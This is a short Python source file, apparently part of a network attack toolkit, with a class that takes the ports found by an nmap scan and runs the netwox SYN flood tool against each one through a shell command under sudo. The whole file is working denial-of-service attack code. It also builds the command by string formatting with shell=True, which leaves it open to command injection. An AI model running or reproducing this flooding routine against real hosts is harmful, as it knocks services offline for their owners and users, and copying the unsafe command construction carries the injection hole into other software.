
from Classes.nmap import nmap_object
import subprocess

class Netwox:

    def syn_flood_network(self, nmap_o: nmap_object):
        for port in nmap_o.ports:
            cmd = ('sudo netwox 76 -i %s -p %s -s raw' % (nmap_o.name, port))
            subprocess.call(cmd, shell=True)
            #  close process
